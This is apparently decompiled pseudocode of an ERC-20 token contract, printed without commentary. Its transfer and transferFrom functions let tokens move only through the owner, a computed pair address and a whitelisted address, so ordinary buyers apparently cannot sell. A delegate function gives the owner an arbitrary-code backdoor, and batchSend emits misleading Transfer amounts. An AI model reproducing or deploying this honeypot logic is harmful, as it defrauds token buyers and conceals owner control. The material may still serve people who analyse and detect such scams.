contract main {




// =====================  Runtime code  =====================


const decimals = 18


mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 totalSupply;
array of uint256 name;
array of uint256 symbol;
address stor5;
address JLPAddress;
mapping of uint8 stor8;

function name() {
    return name[0 len name.length]
}

function JLP() {
    return JLPAddress
}

function totalSupply() {
    return totalSupply
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    return balanceOf[arg1]
}

function symbol() {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[arg1][arg2]
}

function _fallback() payable {
    revert
}

function whiteList(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == stor5
    stor8[address(arg1)] = 1
    JLPAddress = arg1
    emit AddedToWhitelist(arg1);
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function delegate(address arg1, bytes arg2) payable {
    require calldata.size - 4 >= 64
    require arg2 <= 4294967296
    require arg2 + 36 <= calldata.size
    require arg2.length <= 4294967296 and arg2 + arg2.length + 36 <= calldata.size
    mem[128 len arg2.length] = arg2[all]
    mem[arg2.length + 128] = 0
    require msg.sender == stor5
    mem[ceil32(arg2.length) + 128 len floor32(arg2.length)] = call.data[arg2 + 36 len floor32(arg2.length)]
    mem[ceil32(arg2.length) + floor32(arg2.length) + -(arg2.length % 32) + 160 len arg2.length % 32] = mem[-(arg2.length % 32) + floor32(arg2.length) + 160 len arg2.length % 32]
    delegate arg1 with:
       funct (Mask(32, -(8 * ceil32(arg2.length) + -arg2.length + 4) + 256, 0) >> -(8 * ceil32(arg2.length) + -arg2.length + 4) + 256)
         gas gas_remaining wei
        args mem[ceil32(arg2.length) + 132 len arg2.length - 4]
}

function batchSend(address[] arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    require msg.sender == stor5
    require balanceOf[address(msg.sender)] >= arg2 * arg1.length
    balanceOf[address(msg.sender)] += -1 * arg2 * arg1.length
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        _19 = mem[(32 * idx) + 128]
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 0
        balanceOf[mem[(32 * idx) + 140 len 20]] += arg2
        emit Transfer((arg2 / 2), msg.sender, mem[(32 * idx) + 140 len 20]);
        mem[(32 * arg1.length) + 128] = arg2 / 2
        emit Transfer((arg2 / 2), msg.sender, address(_19));
        idx = idx + 1
        continue 
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if 0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7 < this.address:
        if arg1 != stor5:
            if arg2 != stor5:
                if arg1 != address(sha3(0, 11157320132538271434, sha3(12907147938406234195, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                    require arg1 == JLPAddress
    else:
        if arg1 != stor5:
            if arg2 != stor5:
                if arg1 != address(sha3(0, 11157320132538271434, sha3(this.address, 0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                    require arg1 == JLPAddress
    if arg3:
        if arg1 != msg.sender:
            require allowance[address(arg1)][address(msg.sender)] >= arg3
            allowance[address(arg1)][address(msg.sender)] -= arg3
        require balanceOf[address(arg1)] >= arg3
        balanceOf[address(arg1)] -= arg3
        balanceOf[address(arg2)] += arg3
        emit Transfer(arg3, arg1, arg2);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if 0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7 < this.address:
        if stor5 != msg.sender:
            if arg1 != stor5:
                if address(sha3(0, 11157320132538271434, sha3(12907147938406234195, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                    require msg.sender == JLPAddress
    else:
        if stor5 != msg.sender:
            if arg1 != stor5:
                if address(sha3(0, 11157320132538271434, sha3(this.address, 0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                    require msg.sender == JLPAddress
    if arg2:
        if msg.sender != msg.sender:
            require allowance[address(msg.sender)][address(msg.sender)] >= arg2
            allowance[address(msg.sender)][address(msg.sender)] -= arg2
        require balanceOf[address(msg.sender)] >= arg2
        balanceOf[address(msg.sender)] -= arg2
        balanceOf[address(arg1)] += arg2
        emit Transfer(arg2, msg.sender, arg1);
    return 1
}



}
